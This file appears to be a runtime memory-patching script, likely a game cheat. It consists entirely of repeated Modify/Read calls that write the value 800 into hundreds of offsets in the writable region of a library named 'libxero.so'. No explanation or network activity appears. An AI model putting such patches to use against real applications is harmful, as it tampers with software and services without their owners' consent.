Modify(Read('libxero.so','rw-p')+0x6f04,800,4)
Modify(Read('libxero.so','rw-p')+0x6f14,800,4)
Modify(Read('libxero.so','rw-p')+0x6f24,800,4)
Modify(Read('libxero.so','rw-p')+0x6f34,800,4)
Modify(Read('libxero.so','rw-p')+0x6f44,800,4)
Modify(Read('libxero.so','rw-p')+0x6f54,800,4)
Modify(Read('libxero.so','rw-p')+0x6f64,800,4)
Modify(Read('libxero.so','rw-p')+0x6f74,800,4)
Modify(Read('libxero.so','rw-p')+0x6f84,800,4)
Modify(Read('libxero.so','rw-p')+0x6f94,800,4)
Modify(Read('libxero.so','rw-p')+0x6fa4,800,4)
Modify(Read('libxero.so','rw-p')+0x6fb4,800,4)
Modify(Read('libxero.so','rw-p')+0x6fc4,800,4)
Modify(Read('libxero.so','rw-p')+0x6fd0,800,4)
Modify(Read('libxero.so','rw-p')+0x6fd4,800,4)
Modify(Read('libxero.so','rw-p')+0x6fd8,800,4)
Modify(Read('libxero.so','rw-p')+0x6fdc,800,4)
Modify(Read('libxero.so','rw-p')+0x6fe4,800,4)
Modify(Read('libxero.so','rw-p')+0x6ff4,800,4)
Modify(Read('libxero.so','rw-p')+0x7004,800,4)
Modify(Read('libxero.so','rw-p')+0x7014,800,4)
Modify(Read('libxero.so','rw-p')+0x7024,800,4)
Modify(Read('libxero.so','rw-p')+0x7034,800,4)
Modify(Read('libxero.so','rw-p')+0x7044,800,4)
Modify(Read('libxero.so','rw-p')+0x7054,800,4)
Modify(Read('libxero.so','rw-p')+0x7064,800,4)
Modify(Read('libxero.so','rw-p')+0x7074,800,4)
Modify(Read('libxero.so','rw-p')+0x7084,800,4)
Modify(Read('libxero.so','rw-p')+0x7094,800,4)
Modify(Read('libxero.so','rw-p')+0x70a4,800,4)
Modify(Read('libxero.so','rw-p')+0x70b4,800,4)
Modify(Read('libxero.so','rw-p')+0x70c4,800,4)
Modify(Read('libxero.so','rw-p')+0x70d4,800,4)
Modify(Read('libxero.so','rw-p')+0x70e4,800,4)
Modify(Read('libxero.so','rw-p')+0x70f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7104,800,4)
Modify(Read('libxero.so','rw-p')+0x7114,800,4)
Modify(Read('libxero.so','rw-p')+0x7124,800,4)
Modify(Read('libxero.so','rw-p')+0x7134,800,4)
Modify(Read('libxero.so','rw-p')+0x7144,800,4)
Modify(Read('libxero.so','rw-p')+0x7154,800,4)
Modify(Read('libxero.so','rw-p')+0x7164,800,4)
Modify(Read('libxero.so','rw-p')+0x7174,800,4)
Modify(Read('libxero.so','rw-p')+0x7184,800,4)
Modify(Read('libxero.so','rw-p')+0x7194,800,4)
Modify(Read('libxero.so','rw-p')+0x71a4,800,4)
Modify(Read('libxero.so','rw-p')+0x71b4,800,4)
Modify(Read('libxero.so','rw-p')+0x71c4,800,4)
Modify(Read('libxero.so','rw-p')+0x71d4,800,4)
Modify(Read('libxero.so','rw-p')+0x71e4,800,4)
Modify(Read('libxero.so','rw-p')+0x71f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7204,800,4)
Modify(Read('libxero.so','rw-p')+0x7214,800,4)
Modify(Read('libxero.so','rw-p')+0x7224,800,4)
Modify(Read('libxero.so','rw-p')+0x7234,800,4)
Modify(Read('libxero.so','rw-p')+0x7240,800,4)
Modify(Read('libxero.so','rw-p')+0x7244,800,4)
Modify(Read('libxero.so','rw-p')+0x7248,800,4)
Modify(Read('libxero.so','rw-p')+0x724c,800,4)
Modify(Read('libxero.so','rw-p')+0x7284,800,4)
Modify(Read('libxero.so','rw-p')+0x7290,800,4)
Modify(Read('libxero.so','rw-p')+0x7294,800,4)
Modify(Read('libxero.so','rw-p')+0x7298,800,4)
Modify(Read('libxero.so','rw-p')+0x729c,800,4)
Modify(Read('libxero.so','rw-p')+0x72a4,800,4)
Modify(Read('libxero.so','rw-p')+0x72b0,800,4)
Modify(Read('libxero.so','rw-p')+0x72b4,800,4)
Modify(Read('libxero.so','rw-p')+0x72b8,800,4)
Modify(Read('libxero.so','rw-p')+0x72bc,800,4)
Modify(Read('libxero.so','rw-p')+0x72c4,800,4)
Modify(Read('libxero.so','rw-p')+0x72d4,800,4)
Modify(Read('libxero.so','rw-p')+0x72e4,800,4)
Modify(Read('libxero.so','rw-p')+0x72f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7304,800,4)
Modify(Read('libxero.so','rw-p')+0x7314,800,4)
Modify(Read('libxero.so','rw-p')+0x7324,800,4)
Modify(Read('libxero.so','rw-p')+0x7334,800,4)
Modify(Read('libxero.so','rw-p')+0x7344,800,4)
Modify(Read('libxero.so','rw-p')+0x7354,800,4)
Modify(Read('libxero.so','rw-p')+0x7364,800,4)
Modify(Read('libxero.so','rw-p')+0x7374,800,4)
Modify(Read('libxero.so','rw-p')+0x7384,800,4)
Modify(Read('libxero.so','rw-p')+0x7394,800,4)
Modify(Read('libxero.so','rw-p')+0x73a4,800,4)
Modify(Read('libxero.so','rw-p')+0x73b4,800,4)
Modify(Read('libxero.so','rw-p')+0x73c4,800,4)
Modify(Read('libxero.so','rw-p')+0x73d4,800,4)
Modify(Read('libxero.so','rw-p')+0x73e4,800,4)
Modify(Read('libxero.so','rw-p')+0x73f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7404,800,4)
Modify(Read('libxero.so','rw-p')+0x7414,800,4)
Modify(Read('libxero.so','rw-p')+0x7424,800,4)
Modify(Read('libxero.so','rw-p')+0x7434,800,4)
Modify(Read('libxero.so','rw-p')+0x7444,800,4)
Modify(Read('libxero.so','rw-p')+0x7454,800,4)
Modify(Read('libxero.so','rw-p')+0x7464,800,4)
Modify(Read('libxero.so','rw-p')+0x7474,800,4)
Modify(Read('libxero.so','rw-p')+0x7484,800,4)
Modify(Read('libxero.so','rw-p')+0x7494,800,4)
Modify(Read('libxero.so','rw-p')+0x74a4,800,4)
Modify(Read('libxero.so','rw-p')+0x74b4,800,4)
Modify(Read('libxero.so','rw-p')+0x74c4,800,4)
Modify(Read('libxero.so','rw-p')+0x74d4,800,4)
Modify(Read('libxero.so','rw-p')+0x74e4,800,4)
Modify(Read('libxero.so','rw-p')+0x74f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7504,800,4)
Modify(Read('libxero.so','rw-p')+0x7514,800,4)
Modify(Read('libxero.so','rw-p')+0x7524,800,4)
Modify(Read('libxero.so','rw-p')+0x7534,800,4)
Modify(Read('libxero.so','rw-p')+0x7544,800,4)
Modify(Read('libxero.so','rw-p')+0x7554,800,4)
Modify(Read('libxero.so','rw-p')+0x7564,800,4)
Modify(Read('libxero.so','rw-p')+0x7574,800,4)
Modify(Read('libxero.so','rw-p')+0x7584,800,4)
Modify(Read('libxero.so','rw-p')+0x7594,800,4)
Modify(Read('libxero.so','rw-p')+0x75a4,800,4)
Modify(Read('libxero.so','rw-p')+0x75b4,800,4)
Modify(Read('libxero.so','rw-p')+0x75c4,800,4)
Modify(Read('libxero.so','rw-p')+0x75d4,800,4)
Modify(Read('libxero.so','rw-p')+0x75e4,800,4)
Modify(Read('libxero.so','rw-p')+0x75f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7604,800,4)
Modify(Read('libxero.so','rw-p')+0x7614,800,4)
Modify(Read('libxero.so','rw-p')+0x7624,800,4)
Modify(Read('libxero.so','rw-p')+0x7630,800,4)
Modify(Read('libxero.so','rw-p')+0x7634,800,4)
Modify(Read('libxero.so','rw-p')+0x7638,800,4)
Modify(Read('libxero.so','rw-p')+0x763c,800,4)
Modify(Read('libxero.so','rw-p')+0x7644,800,4)
Modify(Read('libxero.so','rw-p')+0x7654,800,4)
Modify(Read('libxero.so','rw-p')+0x7664,800,4)
Modify(Read('libxero.so','rw-p')+0x7674,800,4)
Modify(Read('libxero.so','rw-p')+0x7684,800,4)
Modify(Read('libxero.so','rw-p')+0x7694,800,4)
Modify(Read('libxero.so','rw-p')+0x76a4,800,4)
Modify(Read('libxero.so','rw-p')+0x76b4,800,4)
Modify(Read('libxero.so','rw-p')+0x76c4,800,4)
Modify(Read('libxero.so','rw-p')+0x76d4,800,4)
Modify(Read('libxero.so','rw-p')+0x76e4,800,4)
Modify(Read('libxero.so','rw-p')+0x76f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7704,800,4)
Modify(Read('libxero.so','rw-p')+0x7714,800,4)
Modify(Read('libxero.so','rw-p')+0x7724,800,4)
Modify(Read('libxero.so','rw-p')+0x7734,800,4)
Modify(Read('libxero.so','rw-p')+0x7744,800,4)
Modify(Read('libxero.so','rw-p')+0x7754,800,4)
Modify(Read('libxero.so','rw-p')+0x7764,800,4)
Modify(Read('libxero.so','rw-p')+0x7774,800,4)
Modify(Read('libxero.so','rw-p')+0x7784,800,4)
Modify(Read('libxero.so','rw-p')+0x7794,800,4)
Modify(Read('libxero.so','rw-p')+0x77a4,800,4)
Modify(Read('libxero.so','rw-p')+0x77b4,800,4)
Modify(Read('libxero.so','rw-p')+0x77c4,800,4)
Modify(Read('libxero.so','rw-p')+0x77d4,800,4)
Modify(Read('libxero.so','rw-p')+0x77e4,800,4)
Modify(Read('libxero.so','rw-p')+0x77f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7804,800,4)
Modify(Read('libxero.so','rw-p')+0x7814,800,4)
Modify(Read('libxero.so','rw-p')+0x7824,800,4)
Modify(Read('libxero.so','rw-p')+0x7834,800,4)
Modify(Read('libxero.so','rw-p')+0x7844,800,4)
Modify(Read('libxero.so','rw-p')+0x7854,800,4)
Modify(Read('libxero.so','rw-p')+0x7864,800,4)
Modify(Read('libxero.so','rw-p')+0x7874,800,4)
Modify(Read('libxero.so','rw-p')+0x7884,800,4)
Modify(Read('libxero.so','rw-p')+0x7894,800,4)
Modify(Read('libxero.so','rw-p')+0x78a4,800,4)
Modify(Read('libxero.so','rw-p')+0x78b4,800,4)
Modify(Read('libxero.so','rw-p')+0x78c4,800,4)
Modify(Read('libxero.so','rw-p')+0x78d4,800,4)
Modify(Read('libxero.so','rw-p')+0x78e4,800,4)
Modify(Read('libxero.so','rw-p')+0x78f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7904,800,4)
Modify(Read('libxero.so','rw-p')+0x7914,800,4)
Modify(Read('libxero.so','rw-p')+0x7924,800,4)
Modify(Read('libxero.so','rw-p')+0x7934,800,4)
Modify(Read('libxero.so','rw-p')+0x7944,800,4)
Modify(Read('libxero.so','rw-p')+0x7954,800,4)
Modify(Read('libxero.so','rw-p')+0x7964,800,4)
Modify(Read('libxero.so','rw-p')+0x7974,800,4)
Modify(Read('libxero.so','rw-p')+0x7984,800,4)
Modify(Read('libxero.so','rw-p')+0x7994,800,4)
Modify(Read('libxero.so','rw-p')+0x79a4,800,4)
Modify(Read('libxero.so','rw-p')+0x79b4,800,4)
Modify(Read('libxero.so','rw-p')+0x79c4,800,4)
Modify(Read('libxero.so','rw-p')+0x79d4,800,4)
Modify(Read('libxero.so','rw-p')+0x79e4,800,4)
Modify(Read('libxero.so','rw-p')+0x79f4,800,4)
Modify(Read('libxero.so','rw-p')+0x7a04,800,4)
Modify(Read('libxero.so','rw-p')+0x7a14,800,4)
Modify(Read('libxero.so','rw-p')+0x7a24,800,4)
Modify(Read('libxero.so','rw-p')+0x7a30,800,4)
Modify(Read('libxero.so','rw-p')+0x7a34,800,4)
Modify(Read('libxero.so','rw-p')+0x7a38,800,4)
Modify(Read('libxero.so','rw-p')+0x7a3c,800,4)
Modify(Read('libxero.so','rw-p')+0x7a44,800,4)
Modify(Read('libxero.so','rw-p')+0x7a54,800,4)
Modify(Read('libxero.so','rw-p')+0x7a64,800,4)
Modify(Read('libxero.so','rw-p')+0x7a74,800,4)
Modify(Read('libxero.so','rw-p')+0x7a84,800,4)
Modify(Read('libxero.so','rw-p')+0x7a94,800,4)
Modify(Read('libxero.so','rw-p')+0x7aa4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ab4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ac4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ad4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ae4,800,4)
Modify(Read('libxero.so','rw-p')+0x7af4,800,4)
Modify(Read('libxero.so','rw-p')+0x7b04,800,4)
Modify(Read('libxero.so','rw-p')+0x7b14,800,4)
Modify(Read('libxero.so','rw-p')+0x7b24,800,4)
Modify(Read('libxero.so','rw-p')+0x7b34,800,4)
Modify(Read('libxero.so','rw-p')+0x7b44,800,4)
Modify(Read('libxero.so','rw-p')+0x7b54,800,4)
Modify(Read('libxero.so','rw-p')+0x7b64,800,4)
Modify(Read('libxero.so','rw-p')+0x7b74,800,4)
Modify(Read('libxero.so','rw-p')+0x7b84,800,4)
Modify(Read('libxero.so','rw-p')+0x7b94,800,4)
Modify(Read('libxero.so','rw-p')+0x7ba4,800,4)
Modify(Read('libxero.so','rw-p')+0x7bb4,800,4)
Modify(Read('libxero.so','rw-p')+0x7bc4,800,4)
Modify(Read('libxero.so','rw-p')+0x7bd4,800,4)
Modify(Read('libxero.so','rw-p')+0x7be4,800,4)
Modify(Read('libxero.so','rw-p')+0x7bf4,800,4)
Modify(Read('libxero.so','rw-p')+0x7c04,800,4)
Modify(Read('libxero.so','rw-p')+0x7c14,800,4)
Modify(Read('libxero.so','rw-p')+0x7c24,800,4)
Modify(Read('libxero.so','rw-p')+0x7c34,800,4)
Modify(Read('libxero.so','rw-p')+0x7c44,800,4)
Modify(Read('libxero.so','rw-p')+0x7c54,800,4)
Modify(Read('libxero.so','rw-p')+0x7c64,800,4)
Modify(Read('libxero.so','rw-p')+0x7c74,800,4)
Modify(Read('libxero.so','rw-p')+0x7c84,800,4)
Modify(Read('libxero.so','rw-p')+0x7c94,800,4)
Modify(Read('libxero.so','rw-p')+0x7ca4,800,4)
Modify(Read('libxero.so','rw-p')+0x7cb4,800,4)
Modify(Read('libxero.so','rw-p')+0x7cc4,800,4)
Modify(Read('libxero.so','rw-p')+0x7cd4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ce4,800,4)
Modify(Read('libxero.so','rw-p')+0x7cf4,800,4)
Modify(Read('libxero.so','rw-p')+0x7d04,800,4)
Modify(Read('libxero.so','rw-p')+0x7d14,800,4)
Modify(Read('libxero.so','rw-p')+0x7d24,800,4)
Modify(Read('libxero.so','rw-p')+0x7d34,800,4)
Modify(Read('libxero.so','rw-p')+0x7d44,800,4)
Modify(Read('libxero.so','rw-p')+0x7d54,800,4)
Modify(Read('libxero.so','rw-p')+0x7d64,800,4)
Modify(Read('libxero.so','rw-p')+0x7d74,800,4)
Modify(Read('libxero.so','rw-p')+0x7d84,800,4)
Modify(Read('libxero.so','rw-p')+0x7d94,800,4)
Modify(Read('libxero.so','rw-p')+0x7da0,800,4)
Modify(Read('libxero.so','rw-p')+0x7da4,800,4)
Modify(Read('libxero.so','rw-p')+0x7da8,800,4)
Modify(Read('libxero.so','rw-p')+0x7dac,800,4)
Modify(Read('libxero.so','rw-p')+0x7db4,800,4)
Modify(Read('libxero.so','rw-p')+0x7dc4,800,4)
Modify(Read('libxero.so','rw-p')+0x7dd4,800,4)
Modify(Read('libxero.so','rw-p')+0x7de4,800,4)
Modify(Read('libxero.so','rw-p')+0x7df4,800,4)
Modify(Read('libxero.so','rw-p')+0x7e04,800,4)
Modify(Read('libxero.so','rw-p')+0x7e14,800,4)
Modify(Read('libxero.so','rw-p')+0x7e24,800,4)
Modify(Read('libxero.so','rw-p')+0x7e34,800,4)
Modify(Read('libxero.so','rw-p')+0x7e44,800,4)
Modify(Read('libxero.so','rw-p')+0x7e54,800,4)
Modify(Read('libxero.so','rw-p')+0x7e64,800,4)
Modify(Read('libxero.so','rw-p')+0x7e74,800,4)
Modify(Read('libxero.so','rw-p')+0x7e84,800,4)
Modify(Read('libxero.so','rw-p')+0x7e94,800,4)
Modify(Read('libxero.so','rw-p')+0x7ea4,800,4)
Modify(Read('libxero.so','rw-p')+0x7eb4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ec4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ed4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ee4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ef4,800,4)
Modify(Read('libxero.so','rw-p')+0x7f04,800,4)
Modify(Read('libxero.so','rw-p')+0x7f14,800,4)
Modify(Read('libxero.so','rw-p')+0x7f24,800,4)
Modify(Read('libxero.so','rw-p')+0x7f34,800,4)
Modify(Read('libxero.so','rw-p')+0x7f44,800,4)
Modify(Read('libxero.so','rw-p')+0x7f54,800,4)
Modify(Read('libxero.so','rw-p')+0x7f64,800,4)
Modify(Read('libxero.so','rw-p')+0x7f74,800,4)
Modify(Read('libxero.so','rw-p')+0x7f84,800,4)
Modify(Read('libxero.so','rw-p')+0x7f94,800,4)
Modify(Read('libxero.so','rw-p')+0x7fa4,800,4)
Modify(Read('libxero.so','rw-p')+0x7fb4,800,4)
Modify(Read('libxero.so','rw-p')+0x7fc4,800,4)
Modify(Read('libxero.so','rw-p')+0x7fd4,800,4)
Modify(Read('libxero.so','rw-p')+0x7fe4,800,4)
Modify(Read('libxero.so','rw-p')+0x7ff4,800,4)
Modify(Read('libxero.so','rw-p')+0x8004,800,4)
Modify(Read('libxero.so','rw-p')+0x8010,800,4)
Modify(Read('libxero.so','rw-p')+0x8014,800,4)
Modify(Read('libxero.so','rw-p')+0x8018,800,4)
Modify(Read('libxero.so','rw-p')+0x801c,800,4)
Modify(Read('libxero.so','rw-p')+0x8024,800,4)
Modify(Read('libxero.so','rw-p')+0x8034,800,4)
Modify(Read('libxero.so','rw-p')+0x8044,800,4)
Modify(Read('libxero.so','rw-p')+0x8054,800,4)
Modify(Read('libxero.so','rw-p')+0x8064,800,4)
Modify(Read('libxero.so','rw-p')+0x8074,800,4)
Modify(Read('libxero.so','rw-p')+0x8084,800,4)
Modify(Read('libxero.so','rw-p')+0x8094,800,4)
Modify(Read('libxero.so','rw-p')+0x80a4,800,4)
Modify(Read('libxero.so','rw-p')+0x80b4,800,4)
Modify(Read('libxero.so','rw-p')+0x80c4,800,4)
Modify(Read('libxero.so','rw-p')+0x80d4,800,4)
Modify(Read('libxero.so','rw-p')+0x80e0,800,4)
Modify(Read('libxero.so','rw-p')+0x80e4,800,4)
Modify(Read('libxero.so','rw-p')+0x80e8,800,4)
Modify(Read('libxero.so','rw-p')+0x80ec,800,4)
Modify(Read('libxero.so','rw-p')+0x80f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8104,800,4)
Modify(Read('libxero.so','rw-p')+0x8114,800,4)
Modify(Read('libxero.so','rw-p')+0x8124,800,4)
Modify(Read('libxero.so','rw-p')+0x8134,800,4)
Modify(Read('libxero.so','rw-p')+0x8144,800,4)
Modify(Read('libxero.so','rw-p')+0x8154,800,4)
Modify(Read('libxero.so','rw-p')+0x8160,800,4)
Modify(Read('libxero.so','rw-p')+0x8164,800,4)
Modify(Read('libxero.so','rw-p')+0x8168,800,4)
Modify(Read('libxero.so','rw-p')+0x816c,800,4)
Modify(Read('libxero.so','rw-p')+0x8174,800,4)
Modify(Read('libxero.so','rw-p')+0x8184,800,4)
Modify(Read('libxero.so','rw-p')+0x8194,800,4)
Modify(Read('libxero.so','rw-p')+0x81a4,800,4)
Modify(Read('libxero.so','rw-p')+0x81b4,800,4)
Modify(Read('libxero.so','rw-p')+0x81c4,800,4)
Modify(Read('libxero.so','rw-p')+0x81d4,800,4)
Modify(Read('libxero.so','rw-p')+0x81e4,800,4)
Modify(Read('libxero.so','rw-p')+0x81f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8204,800,4)
Modify(Read('libxero.so','rw-p')+0x8214,800,4)
Modify(Read('libxero.so','rw-p')+0x8224,800,4)
Modify(Read('libxero.so','rw-p')+0x8234,800,4)
Modify(Read('libxero.so','rw-p')+0x8244,800,4)
Modify(Read('libxero.so','rw-p')+0x8254,800,4)
Modify(Read('libxero.so','rw-p')+0x8264,800,4)
Modify(Read('libxero.so','rw-p')+0x8274,800,4)
Modify(Read('libxero.so','rw-p')+0x8284,800,4)
Modify(Read('libxero.so','rw-p')+0x8294,800,4)
Modify(Read('libxero.so','rw-p')+0x82a4,800,4)
Modify(Read('libxero.so','rw-p')+0x82b4,800,4)
Modify(Read('libxero.so','rw-p')+0x82c4,800,4)
Modify(Read('libxero.so','rw-p')+0x82d4,800,4)
Modify(Read('libxero.so','rw-p')+0x82e4,800,4)
Modify(Read('libxero.so','rw-p')+0x82f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8304,800,4)
Modify(Read('libxero.so','rw-p')+0x8314,800,4)
Modify(Read('libxero.so','rw-p')+0x8324,800,4)
Modify(Read('libxero.so','rw-p')+0x8334,800,4)
Modify(Read('libxero.so','rw-p')+0x8344,800,4)
Modify(Read('libxero.so','rw-p')+0x8354,800,4)
Modify(Read('libxero.so','rw-p')+0x8364,800,4)
Modify(Read('libxero.so','rw-p')+0x8374,800,4)
Modify(Read('libxero.so','rw-p')+0x8384,800,4)
Modify(Read('libxero.so','rw-p')+0x8394,800,4)
Modify(Read('libxero.so','rw-p')+0x83a4,800,4)
Modify(Read('libxero.so','rw-p')+0x83b4,800,4)
Modify(Read('libxero.so','rw-p')+0x83c4,800,4)
Modify(Read('libxero.so','rw-p')+0x83d4,800,4)
Modify(Read('libxero.so','rw-p')+0x83e4,800,4)
Modify(Read('libxero.so','rw-p')+0x83f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8404,800,4)
Modify(Read('libxero.so','rw-p')+0x8414,800,4)
Modify(Read('libxero.so','rw-p')+0x8424,800,4)
Modify(Read('libxero.so','rw-p')+0x8434,800,4)
Modify(Read('libxero.so','rw-p')+0x8444,800,4)
Modify(Read('libxero.so','rw-p')+0x8454,800,4)
Modify(Read('libxero.so','rw-p')+0x8464,800,4)
Modify(Read('libxero.so','rw-p')+0x8474,800,4)
Modify(Read('libxero.so','rw-p')+0x8484,800,4)
Modify(Read('libxero.so','rw-p')+0x8494,800,4)
Modify(Read('libxero.so','rw-p')+0x84a0,800,4)
Modify(Read('libxero.so','rw-p')+0x84a4,800,4)
Modify(Read('libxero.so','rw-p')+0x84a8,800,4)
Modify(Read('libxero.so','rw-p')+0x84ac,800,4)
Modify(Read('libxero.so','rw-p')+0x84b4,800,4)
Modify(Read('libxero.so','rw-p')+0x84c4,800,4)
Modify(Read('libxero.so','rw-p')+0x84d4,800,4)
Modify(Read('libxero.so','rw-p')+0x84e4,800,4)
Modify(Read('libxero.so','rw-p')+0x84f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8504,800,4)
Modify(Read('libxero.so','rw-p')+0x8514,800,4)
Modify(Read('libxero.so','rw-p')+0x8524,800,4)
Modify(Read('libxero.so','rw-p')+0x8534,800,4)
Modify(Read('libxero.so','rw-p')+0x8544,800,4)
Modify(Read('libxero.so','rw-p')+0x8554,800,4)
Modify(Read('libxero.so','rw-p')+0x8564,800,4)
Modify(Read('libxero.so','rw-p')+0x8574,800,4)
Modify(Read('libxero.so','rw-p')+0x8584,800,4)
Modify(Read('libxero.so','rw-p')+0x8594,800,4)
Modify(Read('libxero.so','rw-p')+0x85a4,800,4)
Modify(Read('libxero.so','rw-p')+0x85b4,800,4)
Modify(Read('libxero.so','rw-p')+0x85c4,800,4)
Modify(Read('libxero.so','rw-p')+0x85d4,800,4)
Modify(Read('libxero.so','rw-p')+0x85e4,800,4)
Modify(Read('libxero.so','rw-p')+0x85f4,800,4)
Modify(Read('libxero.so','rw-p')+0x8604,800,4)
Modify(Read('libxero.so','rw-p')+0x8614,800,4)
Modify(Read('libxero.so','rw-p')+0x8624,800,4)
Modify(Read('libxero.so','rw-p')+0x8634,800,4)
Modify(Read('libxero.so','rw-p')+0x8644,800,4)
Modify(Read('libxero.so','rw-p')+0x8654,800,4)
Modify(Read('libxero.so','rw-p')+0x8664,800,4)
Modify(Read('libxero.so','rw-p')+0x8674,800,4)
Modify(Read('libxero.so','rw-p')+0x8684,800,4)
Modify(Read('libxero.so','rw-p')+0x8694,800,4)
Modify(Read('libxero.so','rw-p')+0x86a4,800,4)
Modify(Read('libxero.so','rw-p')+0x86b4,800,4)
Modify(Read('libxero.so','rw-p')+0x86c4,800,4)
Modify(Read('libxero.so','rw-p')+0x86d0,800,4)
Modify(Read('libxero.so','rw-p')+0x86d4,800,4)
Modify(Read('libxero.so','rw-p')+0x86d8,800,4)
Modify(Read('libxero.so','rw-p')+0x86dc,800,4)
Modify(Read('libxero.so','rw-p')+0x86e8,800,4)
Modify(Read('libxero.so','rw-p')+0x86ec,800,4)
Modify(Read('libxero.so','rw-p')+0x86f8,800,4)
Modify(Read('libxero.so','rw-p')+0x86fc,800,4)
Modify(Read('libxero.so','rw-p')+0x8714,800,4)
Modify(Read('libxero.so','rw-p')+0x872c,800,4)
Modify(Read('libxero.so','rw-p')+0x8744,800,4)
Modify(Read('libxero.so','rw-p')+0x875c,800,4)
Modify(Read('libxero.so','rw-p')+0x8774,800,4)
Modify(Read('libxero.so','rw-p')+0x878c,800,4)
Modify(Read('libxero.so','rw-p')+0x87a4,800,4)
Modify(Read('libxero.so','rw-p')+0x87bc,800,4)
Modify(Read('libxero.so','rw-p')+0x87d4,800,4)
Modify(Read('libxero.so','rw-p')+0x87d8,800,4)
Modify(Read('libxero.so','rw-p')+0x87dc,800,4)
Modify(Read('libxero.so','rw-p')+0x87e0,800,4)
Modify(Read('libxero.so','rw-p')+0x87e4,800,4)
Modify(Read('libxero.so','rw-p')+0x87e8,800,4)
Modify(Read('libxero.so','rw-p')+0x87ec,800,4)
Modify(Read('libxero.so','rw-p')+0x8804,800,4)
Modify(Read('libxero.so','rw-p')+0x881c,800,4)
Modify(Read('libxero.so','rw-p')+0x8834,800,4)
Modify(Read('libxero.so','rw-p')+0x884c,800,4)
Modify(Read('libxero.so','rw-p')+0x8864,800,4)
Modify(Read('libxero.so','rw-p')+0x887c,800,4)
Modify(Read('libxero.so','rw-p')+0x8894,800,4)
Modify(Read('libxero.so','rw-p')+0x88ac,800,4)
Modify(Read('libxero.so','rw-p')+0x88b0,800,4)
Modify(Read('libxero.so','rw-p')+0x88b4,800,4)
Modify(Read('libxero.so','rw-p')+0x88b8,800,4)
Modify(Read('libxero.so','rw-p')+0x88bc,800,4)
Modify(Read('libxero.so','rw-p')+0x88c0,800,4)
Modify(Read('libxero.so','rw-p')+0x88c4,800,4)
Modify(Read('libxero.so','rw-p')+0x88dc,800,4)
Modify(Read('libxero.so','rw-p')+0x88f4,800,4)
Modify(Read('libxero.so','rw-p')+0x890c,800,4)
Modify(Read('libxero.so','rw-p')+0x8924,800,4)
Modify(Read('libxero.so','rw-p')+0x893c,800,4)
Modify(Read('libxero.so','rw-p')+0x8954,800,4)
Modify(Read('libxero.so','rw-p')+0x896c,800,4)
Modify(Read('libxero.so','rw-p')+0x8984,800,4)
Modify(Read('libxero.so','rw-p')+0x899c,800,4)
Modify(Read('libxero.so','rw-p')+0x89b4,800,4)
Modify(Read('libxero.so','rw-p')+0x89b8,800,4)
Modify(Read('libxero.so','rw-p')+0x89bc,800,4)
Modify(Read('libxero.so','rw-p')+0x89c0,800,4)
Modify(Read('libxero.so','rw-p')+0x89c4,800,4)
Modify(Read('libxero.so','rw-p')+0x89cc,800,4)
Modify(Read('libxero.so','rw-p')+0x89dc,800,4)
Modify(Read('libxero.so','rw-p')+0x89ec,800,4)
Modify(Read('libxero.so','rw-p')+0x89fc,800,4)
Modify(Read('libxero.so','rw-p')+0x8a0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a5c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8a9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8aac,800,4)
Modify(Read('libxero.so','rw-p')+0x8abc,800,4)
Modify(Read('libxero.so','rw-p')+0x8acc,800,4)
Modify(Read('libxero.so','rw-p')+0x8adc,800,4)
Modify(Read('libxero.so','rw-p')+0x8aec,800,4)
Modify(Read('libxero.so','rw-p')+0x8afc,800,4)
Modify(Read('libxero.so','rw-p')+0x8b0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b5c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b6c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b7c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b8c,800,4)
Modify(Read('libxero.so','rw-p')+0x8b9c,800,4)
Modify(Read('libxero.so','rw-p')+0x8bac,800,4)
Modify(Read('libxero.so','rw-p')+0x8bbc,800,4)
Modify(Read('libxero.so','rw-p')+0x8bcc,800,4)
Modify(Read('libxero.so','rw-p')+0x8bdc,800,4)
Modify(Read('libxero.so','rw-p')+0x8bec,800,4)
Modify(Read('libxero.so','rw-p')+0x8bfc,800,4)
Modify(Read('libxero.so','rw-p')+0x8c0c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c1c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c2c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c3c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c4c,800,4)
Modify(Read('libxero.so','rw-p')+0x8c5c,800,4)
